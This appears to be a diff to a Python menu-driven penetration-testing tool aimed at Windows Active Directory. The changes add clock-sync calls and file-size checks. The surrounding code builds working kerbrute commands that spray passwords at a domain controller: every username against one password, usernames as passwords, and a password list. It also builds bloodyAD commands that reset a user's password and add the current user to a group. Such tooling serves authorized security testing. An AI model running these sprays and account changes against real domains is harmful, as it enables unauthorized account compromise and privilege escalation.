@@ -2515,14 +2515,17 @@ while True:
 
    if selection =='53':
       checkParam = test_TIP()
-      found = 0            
+      found = 0
+      SKEW = timeSync(SKEW)            
       if checkParam != 1:
          checkParam = test_DOM()
       if checkParam != 1:
          print(colored("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...", colour3))
          remoteCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -password '" + PAS.rstrip(" ") + "' -outputfile password1.tmp")
-         test1 = linecache.getline("password1.tmp", 1)               
-         if test1 != "":
+         if os.path.getsize("password1.tmp") == 0:
+            pass
+         else:
+            test1 = linecache.getline("password1.tmp",1)   
             found = 1
             USR,PAS = test1.split(":")
             USR = spacePadding(USR, COL1)
@@ -2532,9 +2535,11 @@ while True:
             TGT = privCheck()                      
          if found <= 1:
             print(colored("\n[*] Now trying all usernames with matching passwords...",colour3))
-            remoteCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/usernames.txt -outputfile password2.tmp")
-            test2 = linecache.getline("password2.tmp", 1)                        
-            if test2 != "":
+            remoteCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/usernames.txt -outputfile password2.tmp")                       
+            if os.path.getsize("password2.tmp") == 0:
+               pass
+            else:
+               test2 = linecache.getline("password2.tmp",1)   
                found = found + 1
                USR,PAS = test2.split(":")
                USR = spacePadding(USR, COL1)
@@ -2543,8 +2548,10 @@ while True:
          if found == 0:
             print(colored("\n[*] Now trying all users against password list, please wait as this could take sometime...",colour3))            
             remoteCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/passwords.txt -outputfile password3.tmp")                 
-            test3 = linecache.getline("password3.tmp", 1)                       
-            if test3 != "":
+            if os.path.getsize("password3.tmp") == 0:
+               pass
+            else:
+               test3 = linecache.getline("password3.tmp",1)   
                USR,PAS = test3.split(":") 
                USR = spacePadding(USR, COL1)
                PAS = spacePadding(PAS, COL1)
@@ -4688,6 +4695,7 @@ while True:
    if selection == '606':
       AD1 = input("[?] Please enter new users name: ")
       AD2 = input("[?] Please enter new users password: ")
+      SKEW = timeSync(SKEW)
       localCOM("bloodyAD --host " + TIP.rstrip("") + " -d " + DOM.rstrip("") + " -u " + USR.rstrip("") + "  -p " + PAS.rstrip("") + " set password " + AD1.rstrip("") + " " + AD2.rstrip(""))
       prompt()
 
@@ -4711,6 +4719,7 @@ while True:
 
    if selection == '607':
       AD1 = input("[?] Please enter new group name: ")
+      SKEW = timeSync(SKEW)
       localCOM("bloodyAD --host " + TIP.rstrip("") + " -d " + DOM.rstrip("") + " -u " + USR.rstrip("") + "  -p " + PAS.rstrip("") + " add groupMember '" + AD1.rstrip("") + "' " + USR.rstrip(""))
       prompt() 
       
